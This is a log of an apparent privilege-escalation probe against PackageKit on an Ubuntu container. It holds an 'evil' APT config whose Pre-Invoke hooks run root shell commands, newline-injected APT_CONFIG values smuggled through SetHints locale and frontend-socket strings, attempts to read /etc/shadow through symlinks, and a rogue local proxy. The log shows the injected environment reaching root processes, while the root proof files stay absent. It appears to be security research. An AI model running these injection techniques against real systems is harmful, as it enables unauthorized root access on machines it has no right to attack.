    <message xml:lang="fi">Verkon välityspalvelimen asettaminen ohjelmistojen latausta varten vaatii tunnistautumisen</message>
    <message xml:lang="eu">Autentifikazioa behar da softwarea deskargatzeko erabiliko den sare-proxya ezartzeko</message>
    <message xml:lang="es">Necesita autenticarse para definir el proxy de red usado para descargar software</message>
    <message xml:lang="en_GB">Authentication is required to set the network proxy used for downloading software</message>
    <message xml:lang="el">Απαιτείται πιστοποίηση για τον ορισμό του διαμεσολαβητή δικτύου που χρησιμοποιείται για τη λήψη λογισμικού</message>
    <message xml:lang="de">Legitimation ist zum Festlegen eines Netzwerk-Proxys zum Herunterladen von Software erforderlich</message>
    <message xml:lang="da">Godkendelse kræves for at angive netværksproxy anvendt for overførsel af programmer</message>
    <message xml:lang="cs">Pro nastavení síťové proxy, které se použije ke stažení softwaru, je vyžadováno ověření</message>
    <message xml:lang="ca">Es requereix autenticació per establir el servidor intermediari de xarxa que s'utilitza per baixar el programari</message>
    <message xml:lang="ar">الاستيثاق مطلوب لتعيين وكيل شبكة سيستخدم لتنزيل البرامج</message>
    <icon_name>preferences-system-network-proxy</icon_name>
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
  </action>

== PackageKit interface anchors ==
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:141:    <method name="SetHints">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:254:    <method name="Cancel">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:422:    <method name="GetDetailsLocal">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:451:    <method name="GetFilesLocal">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:739:    <method name="InstallFiles">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:887:    <method name="RefreshCache">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:999:    <method name="RepoEnable">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml:1030:    <method name="RepoSetData">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.xml:378:    <method name="SetProxy">
/usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.xml:637:    <method name="Cancel">

$ docker exec -i ubuntu24-server-lpe-target bash

== target cleanup/setup ==
dpkg-deb: building package 'packagekit-transaction-deep2-root' in '/tmp/packagekit-transaction-deep2/packagekit-transaction-deep2-root.deb'.
-rw-r--r-- 1 selfauth selfauth  196 May 16 20:18 /tmp/packagekit-transaction-deep2/evil-apt.conf
-rw-r--r-- 1 selfauth selfauth 1008 May 16 20:18 /tmp/packagekit-transaction-deep2/packagekit-transaction-deep2-root.deb
-rw-r--r-- 1 selfauth selfauth  196 May 16 20:18 /tmp/pkdeep2.conf
== active-seat probe execution ==
openvt: Couldn't deallocate console 1

== attacker-created package/config proof ==
-rw-r--r-- 1 selfauth selfauth  196 May 16 20:18 /tmp/packagekit-transaction-deep2/evil-apt.conf
-rw-r--r-- 1 selfauth selfauth 1008 May 16 20:18 /tmp/packagekit-transaction-deep2/packagekit-transaction-deep2-root.deb
-rw-r--r-- 1 selfauth selfauth  196 May 16 20:18 /tmp/pkdeep2.conf
 new Debian package, version 2.0.
 size 1008 bytes: control archive=625 bytes.
     155 bytes,     7 lines   *  config               #!/bin/sh
     222 bytes,     7 lines      control
     308 bytes,    12 lines   *  postinst             #!/bin/sh
     238 bytes,     6 lines      templates
 Package: packagekit-transaction-deep2-root
 Version: 1.0
 Section: misc
 Priority: optional
 Architecture: all
 Maintainer: PackageKit Deep2 Probe <root@example.invalid>
 Description: PackageKit transaction deep2 marker package
--- evil apt config ---
APT::Update::Pre-Invoke { "/bin/sh -c '\''id > /root/packagekit_transaction_deep2_root'\''"; };
DPkg::Pre-Install-Pkgs { "/bin/sh -c '\''id > /root/packagekit_transaction_deep2_root.dpkg'\''"; };

== active selfauth transcript ==
active-runner-start 2026-05-16T20:18:45+00:00
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
selfauth
/dev/tty1
XDG_SESSION_ID=21
Id=21
User=1002
Name=selfauth
Seat=seat0
TTY=tty1
Remote=no
Type=tty
Class=user
Active=yes
State=active
== active user/session proof ==
uid=1002 gid=1002 groups=[1002]
tty=/dev/tty1
XDG_SESSION_ID=21
CanAuthorize org.freedesktop.packagekit.system-sources-refresh -> 1
CanAuthorize org.freedesktop.packagekit.system-network-proxy-configure -> 1
CanAuthorize org.freedesktop.packagekit.system-sources-configure -> 3
CanAuthorize org.freedesktop.packagekit.package-install-untrusted -> 3
CanAuthorize org.freedesktop.packagekit.system-update -> 3
== scenario: SetHints locale/unknown env strings into active RefreshCache ==
PROXY_READY label=hint-env-refresh port=35907
SetProxy ok http='127.0.0.1:35907' no_proxy='localhost' pac=''
  tx=/20_cedebced
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  SetHints locale-newline-refresh: ok ['locale=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1', 'packagekit-transaction-deep2=x\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_UNKNOWN_SPLIT=1', 'interactive=true', 'background=false', 'cache-age=1', 'supports-plural-signals=true']
  method_return refresh-hint-env: ok
PROXY_HIT label=hint-env-refresh addr=('127.0.0.1', 45644) first='GET http://ports.ubuntu.com/ubuntu-ports/dists/noble/InRelease HTTP/1.1'
PROXY_HEADER label=hint-env-refresh 'Host: ports.ubuntu.com'
PROXY_HEADER label=hint-env-refresh 'User-Agent: Debian APT-HTTP/1.3 (2.8.3)'
PROXY_HIT label=hint-env-refresh addr=('127.0.0.1', 45658) first='GET http://ports.ubuntu.com/ubuntu-ports/dists/noble-updates/InRelease HTTP/1.1'
PROXY_HEADER label=hint-env-refresh 'Host: ports.ubuntu.com'
PROXY_HEADER label=hint-env-refresh 'User-Agent: Debian APT-HTTP/1.3 (2.8.3)'
PROXY_HIT label=hint-env-refresh addr=('127.0.0.1', 45660) first='GET http://ports.ubuntu.com/ubuntu-ports/dists/noble-backports/InRelease HTTP/1.1'
PROXY_HEADER label=hint-env-refresh 'Host: ports.ubuntu.com'
PROXY_HEADER label=hint-env-refresh 'User-Agent: Debian APT-HTTP/1.3 (2.8.3)'
PROXY_HIT label=hint-env-refresh addr=('127.0.0.1', 45676) first='GET http://ports.ubuntu.com/ubuntu-ports/dists/noble-security/InRelease HTTP/1.1'
PROXY_HEADER label=hint-env-refresh 'Host: ports.ubuntu.com'
PROXY_HEADER label=hint-env-refresh 'User-Agent: Debian APT-HTTP/1.3 (2.8.3)'
  signal refresh-hint-env path=/20_cedebced ErrorCode (64, "E: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble-backports/InRelease  Clearsigned file isn't valid, got 'NOSPLIT' (does the network require authentication?)\nE: The repository 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease' is no longer signed.\nW: Updating from such a repository can't be done securely, and is therefore disabled by default.\nW: See apt-secure(8) manpage for repository creation and user configuration details.\nE: http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease is not (yet) available (Clearsigned file isn't valid, got 'NOSPLIT' (does the network require authentication?))\nE: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble-security/InRelease  Clearsigned file isn't valid, got 'NOSPLIT' (does the network require authentication?)\nE: The repository 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease' is no longer signed.\nW: Updating from such a repository can't be done securely, and is therefore disabled by default.\nW: See apt-secure(8) manpage for repository creation and user configuration details.\nE: http://ports.ubuntu.com/ubuntu-ports noble-security InRelease is not (yet) available (Clearsigned file isn't valid, got 'NOSPLIT' (does the network require authentication?))\n")
  signal refresh-hint-env path=/20_cedebced Finished (2, 2557)
SetProxy ok http='' no_proxy='' pac=''
PROXY_COUNT label=hint-env-refresh count=4
== scenario: running RefreshCache cancel and same-transaction reuse ==
PROXY_READY label=cancel-refresh port=41869
SetProxy ok http='127.0.0.1:41869' no_proxy='' pac=''
  tx=/21_eeeebcca
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  SetHints pre-refresh: ok ['locale=C.UTF-8', 'interactive=true', 'cache-age=1']
  method_return cancel-refresh RefreshCache: ok
  direct_call InstallFiles real while RefreshCache running: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /21_eeeebcca: already in state running
  direct_call RepoEnable while RefreshCache running: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call RepoEnable on transaction /21_eeeebcca: already in state running
  direct_call Cancel running RefreshCache: ok
  signal cancel-refresh path=/21_eeeebcca ErrorCode (64, 'E: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble/InRelease  \nE: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble-updates/InRelease  \nE: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble-backports/InRelease  \nE: Failed to fetch http://ports.ubuntu.com/ubuntu-ports/dists/noble-security/InRelease  \nE: Some index files failed to download. They have been ignored, or old ones used instead.\n')
  signal cancel-refresh path=/21_eeeebcca Finished (3, 1861)
  props={'Uid': 1002, 'CallerActive': True, 'Role': 13, 'Status': 18, 'TransactionFlags': 0}
  direct_call SetHints after cancel/finish: ok
  direct_call InstallFiles real after cancel/finish: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /21_eeeebcca: already in state finished
  direct_call RefreshCache second action after cancel/finish: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call RefreshCache on transaction /21_eeeebcca: already in state finished
SetProxy ok http='' no_proxy='' pac=''
PROXY_COUNT label=cancel-refresh count=0
== scenario: query/only-download transaction reuse after finish ==
  tx=/22_daeddded
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return getupdates-before-reuse: ok
  signal getupdates-before-reuse path=/22_daeddded Finished (1, 1804)
  props={'Uid': 1002, 'CallerActive': True, 'Role': 9, 'Status': 18, 'TransactionFlags': 0}
  direct_call InstallFiles real after GetUpdates finished: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /22_daeddded: already in state finished
  tx=/23_edcaadee
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return only-download-before-reuse: ok
  signal only-download-before-reuse path=/23_edcaadee Package (10, 'packagekit-transaction-deep2-root;1.0;all;+manual:local', 'PackageKit transaction deep2 marker package')
  signal only-download-before-reuse path=/23_edcaadee ItemProgress ('packagekit-transaction-deep2-root;1.0;all;+manual:local', 8, 0)
  signal only-download-before-reuse path=/23_edcaadee Package (18, 'packagekit-transaction-deep2-root;1.0;all;+manual:local', 'PackageKit transaction deep2 marker package')
  signal only-download-before-reuse path=/23_edcaadee Finished (1, 2009)
  props={'Uid': 1002, 'CallerActive': True, 'Role': 10, 'Status': 18, 'TransactionFlags': 8}
  direct_call InstallFiles real after ONLY_DOWNLOAD finished: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /23_edcaadee: already in state finished
== scenario: repo source configure paths from active non-admin user ==
  tx=/24_bddbccae
  method_return GetRepoList: ok
  signal repo-list path=/24_bddbccae Finished (1, 0)
  selected_repo='ubuntu:noble-main' repo_count=0
  tx=/25_ccabbecd
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return repo-enable-noop: ok
  signal repo-enable-noop path=/25_ccabbecd ErrorCode (48, 'Failed to obtain authentication.')
  signal repo-enable-noop path=/25_ccabbecd Finished (2, 0)
  tx=/26_dbdbceeb
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return repo-set-data-newline: GDBus.Error:org.freedesktop.PackageKit.Transaction.NotSupported: RepoSetData not supported by backend
== scenario: local deb path, /proc fd, symlink, and root-file parser boundaries ==
  proc_fd_path=/proc/189599/fd/7
  tx=/27_ebbcabdd
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return details-procfd: ok
  signal details-procfd path=/27_ebbcabdd Finished (1, 1279)
  tx=/28_aadaebea
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return files-procfd: ok
  signal files-procfd path=/28_aadaebea Files ('packagekit-transaction-deep2-root;1.0;all;/proc/189599/fd/7', ['/', '/usr', '/usr/local', '/usr/local/share', '/usr/local/share/packagekit-transaction-deep2', '/usr/local/share/packagekit-transaction-deep2/payload.txt'])
  signal files-procfd path=/28_aadaebea Finished (1, 0)
  tx=/29_dcaecccb
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return installfiles-only-download-procfd: ok
  signal installfiles-only-download-procfd path=/29_dcaecccb ErrorCode (8, 'Could not find package(s)')
  signal installfiles-only-download-procfd path=/29_dcaecccb Finished (2, 1321)
  tx=/30_aebcaede
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return installfiles-real-procfd: ok
  signal installfiles-real-procfd path=/30_aebcaede ErrorCode (48, 'Failed to obtain authentication.')
  signal installfiles-real-procfd path=/30_aebcaede Finished (2, 0)
  tx=/31_bcdccbaa
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return details-symlink-to-deb: ok
  signal details-symlink-to-deb path=/31_bcdccbaa Details ({'package-id': 'packagekit-transaction-deep2-root;1.0;all;local', 'group': 20, 'summary': 'PackageKit transaction deep2 marker package', 'description': 'PackageKit transaction deep2 marker package', 'url': '', 'license': 'unknown', 'size': 1008},)
  signal details-symlink-to-deb path=/31_bcdccbaa Finished (1, 1334)
  tx=/32_cdaeeeed
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return details-symlink-to-shadow: ok
  signal details-symlink-to-shadow path=/32_cdaeeeed ErrorCode (26, 'E: Invalid archive signature\nE: Internal error, could not locate member control.tar{.zst,.lz4,.gz,.xz,.bz2,.lzma,}\nE: Could not read meta data from /etc/shadow\nE: The package lists or status file could not be parsed or opened.\n')
  signal details-symlink-to-shadow path=/32_cdaeeeed Finished (2, 1007)
  tx=/33_cacebaee
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  method_return fileslocal-shadow-direct: GDBus.Error:org.freedesktop.PackageKit.Transaction.NoSuchFile: File /etc/shadow is not found or unsupported
== scenario: frontend-socket newline path with query/real-install auth boundary ==
FRONTEND_READY path='/tmp/packagekit-transaction-deep2/frontend\nAPT_CONFIG=/tmp/pkdeep2.conf'
  tx=/34_dbddabea
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  SetHints frontend-newline: ok ['frontend-socket=/tmp/packagekit-transaction-deep2/frontend\nAPT_CONFIG=/tmp/pkdeep2.conf', 'interactive=true', 'locale=C.UTF-8']
  method_return getupdates-frontend-newline: ok
  signal getupdates-frontend-newline path=/34_dbddabea Finished (1, 1474)
  tx=/35_aebcbbda
  props={'Uid': 1002, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
  SetHints frontend-newline-real: ok ['frontend-socket=/tmp/packagekit-transaction-deep2/frontend\nAPT_CONFIG=/tmp/pkdeep2.conf', 'interactive=true', 'locale=C.UTF-8']
  method_return installfiles-real-frontend: ok
  signal installfiles-real-frontend path=/35_aebcbbda ErrorCode (48, 'Failed to obtain authentication.')
  signal installfiles-real-frontend path=/35_aebcbbda Finished (2, 0)
FRONTEND_EVENTS path='/tmp/packagekit-transaction-deep2/frontend\nAPT_CONFIG=/tmp/pkdeep2.conf' events=[]
SetProxy ok http='' no_proxy='' pac=''
== active probe complete ==
active-runner-exit rc=0 2026-05-16T20:19:09+00:00

== root process environment monitor ==
ENV_SNAPSHOT pid=189429 uid=0 cmd='curl -fsSL --connect-timeout 8 --max-time 45 https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/gstreamer1.0/1.24.2-1ubuntu0.1/gstreamer1.0_1.24.2.orig.tar.xz -o /tmp/residual-helper-parser-root/src/gstreamer.tar.xz '
  ENV_ITEM b'LC_ALL=C'
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189493 uid=0 cmd='/usr/libexec/packagekitd '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189527 uid=0 cmd='python3 /tmp/packagekit-transaction-deep2/root_monitor.py '
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189593 uid=1002 cmd='/bin/bash /home/selfauth/packagekit_transaction_deep2_runner.sh '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189599 uid=1002 cmd='python3 /home/selfauth/packagekit_transaction_deep2_probe.py '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189626 uid=0 cmd='/usr/libexec/packagekitd '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189627 uid=0 cmd='sh -c -- [ ! -e /run/systemd/system ] || [ $(id -u) -ne 0 ] || systemctl start --no-block apt-news.service esm-cache.service >/dev/null 2>&1 || true '
  ENV_ITEM b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  ENV_ITEM b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  ENV_ITEM b'http_proxy=http://127.0.0.1:35907/'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189629 uid=0 cmd='systemctl start --no-block apt-news.service esm-cache.service '
  ENV_ITEM b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  ENV_ITEM b'http_proxy=http://127.0.0.1:35907/'
  ENV_ITEM b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189630 uid=0 cmd='/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189632 uid=42 cmd='/usr/lib/apt/methods/http '
  ENV_ITEM b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  ENV_ITEM b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/pkdeep2.conf\nPKDEEP2_LOCALE_SPLIT=1'
  ENV_ITEM b'http_proxy=http://127.0.0.1:35907/'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189647 uid=42 cmd='/usr/lib/apt/methods/https '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189648 uid=0 cmd='curl -fsSL --connect-timeout 8 --max-time 45 https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1%3A9.6p1-3ubuntu13.16/openssh_9.6p1.orig.tar.gz -o /tmp/residual-helper-parser-root/src/openssh.tgz '
  ENV_ITEM b'LC_ALL=C'
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189652 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189653 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189654 uid=42 cmd='/bin/sh /usr/bin/apt-key --quiet --readonly --keyring /usr/share/keyrings/ubuntu-pro-esm-apps.gpg verify --status-fd 3 /tmp/apt.sig.fhakPh /tmp/apt.data.CsaOZH '
  ENV_ITEM b'LANG='
  ENV_ITEM b'APT_CONFIG=/tmp/apt.conf.XKHngV'
  ENV_ITEM b'LC_ALL='
  ENV_ITEM b'LC_MESSAGES='
  SEPARATE_APT_CONFIG=1 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189687 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189688 uid=42 cmd='/bin/sh /usr/bin/apt-key --quiet --readonly --keyring /usr/share/keyrings/ubuntu-pro-esm-apps.gpg verify --status-fd 3 /tmp/apt.sig.E2CCPO /tmp/apt.data.Jz471H '
  ENV_ITEM b'LANG='
  ENV_ITEM b'APT_CONFIG=/tmp/apt.conf.4sBBbv'
  ENV_ITEM b'LC_ALL='
  ENV_ITEM b'LC_MESSAGES='
  SEPARATE_APT_CONFIG=1 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189736 uid=0 cmd='/usr/lib/apt/methods/http '
  ENV_ITEM b'LANG=C.UTF-8'
  ENV_ITEM b'LANGUAGE=C.UTF-8'
  ENV_ITEM b'http_proxy=http://127.0.0.1:41869/'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189737 uid=0 cmd='/usr/libexec/packagekitd '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189738 uid=0 cmd='sh -c -- [ ! -e /run/systemd/system ] || [ $(id -u) -ne 0 ] || systemctl start --no-block apt-news.service esm-cache.service >/dev/null 2>&1 || true '
  ENV_ITEM b'LANG=C.UTF-8'
  ENV_ITEM b'LANGUAGE=C.UTF-8'
  ENV_ITEM b'http_proxy=http://127.0.0.1:41869/'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189740 uid=0 cmd='systemctl start --no-block apt-news.service esm-cache.service '
  ENV_ITEM b'LANGUAGE=C.UTF-8'
  ENV_ITEM b'http_proxy=http://127.0.0.1:41869/'
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189741 uid=0 cmd='/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189755 uid=42 cmd='/usr/lib/apt/methods/https '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189757 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189759 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189760 uid=42 cmd='/bin/sh /usr/bin/apt-key --quiet --readonly --keyring /usr/share/keyrings/ubuntu-pro-esm-apps.gpg verify --status-fd 3 /tmp/apt.sig.OWXpm2 /tmp/apt.data.1IVopA '
  ENV_ITEM b'LANG='
  ENV_ITEM b'APT_CONFIG=/tmp/apt.conf.uM7AQZ'
  ENV_ITEM b'LC_ALL='
  ENV_ITEM b'LC_MESSAGES='
  SEPARATE_APT_CONFIG=1 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189764 uid=42 cmd='apt-config shell ARCHIVE_KEYRING APT::Key::ArchiveKeyring '
  ENV_ITEM b'APT_CONFIG=/tmp/apt.conf.uM7AQZ'
  ENV_ITEM b'LANG='
  ENV_ITEM b'LC_MESSAGES='
  ENV_ITEM b'LC_ALL='
  SEPARATE_APT_CONFIG=1 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189795 uid=42 cmd='/usr/lib/apt/methods/gpgv '
  ENV_ITEM b'LANG=C.UTF-8'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189796 uid=42 cmd='/bin/sh /usr/bin/apt-key --quiet --readonly --keyring /usr/share/keyrings/ubuntu-pro-esm-apps.gpg verify --status-fd 3 /tmp/apt.sig.otnLtt /tmp/apt.data.1DqPMk '
  ENV_ITEM b'LANG='
  ENV_ITEM b'APT_CONFIG=/tmp/apt.conf.CqO1qu'
  ENV_ITEM b'LC_ALL='
  ENV_ITEM b'LC_MESSAGES='
  SEPARATE_APT_CONFIG=1 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189841 uid=0 cmd='curl -fsSL --connect-timeout 8 --max-time 45 https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/libutempter/1.2.1-3build1/libutempter_1.2.1.orig.tar.gz -o /tmp/residual-helper-parser-root/src/libutempter.tgz '
  ENV_ITEM b'LC_ALL=C'
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189855 uid=0 cmd='curl -fsSL --connect-timeout 8 --max-time 45 https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/fuse3/3.14.0-5build1/fuse3_3.14.0.orig.tar.xz -o /tmp/residual-helper-parser-root/src/fuse3.tar.xz '
  ENV_ITEM b'LC_ALL=C'
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189861 uid=0 cmd='/usr/bin/dpkg --force-confdef --force-confold --print-foreign-architectures '
  ENV_ITEM b'LANG=C'
  ENV_ITEM b'LANGUAGE=C'
  ENV_ITEM b'http_proxy=http://127.0.0.1:41869/'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0
ENV_SNAPSHOT pid=189874 uid=0 cmd='curl -fsSL --connect-timeout 8 --max-time 45 https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/util-linux/2.39.3-9ubuntu6.5/util-linux_2.39.3.orig.tar.xz -o /tmp/residual-helper-parser-root/src/util-linux.tar.xz '
  ENV_ITEM b'LC_ALL=C'
  ENV_ITEM b'DEBIAN_FRONTEND=noninteractive'
  SEPARATE_APT_CONFIG=0 SEPARATE_PKDEEP2=0

== post-probe root proof checks ==
ROOT_PROOF_ABSENT /root/packagekit_transaction_deep2_root
ROOT_DPKG_PROOF_ABSENT /root/packagekit_transaction_deep2_root.dpkg
dpkg-query: no packages found matching packagekit-transaction-deep2-root
running

== cleanup ==
ABSENT /tmp/packagekit-transaction-deep2
ABSENT /home/selfauth/packagekit_transaction_deep2_runner.sh
ABSENT /home/selfauth/packagekit_transaction_deep2_probe.py
ABSENT /tmp/pkdeep2.conf
ABSENT /root/packagekit_transaction_deep2_root
ABSENT /root/packagekit_transaction_deep2_root.dpkg
dpkg-query: no packages found matching packagekit-transaction-deep2-root
running
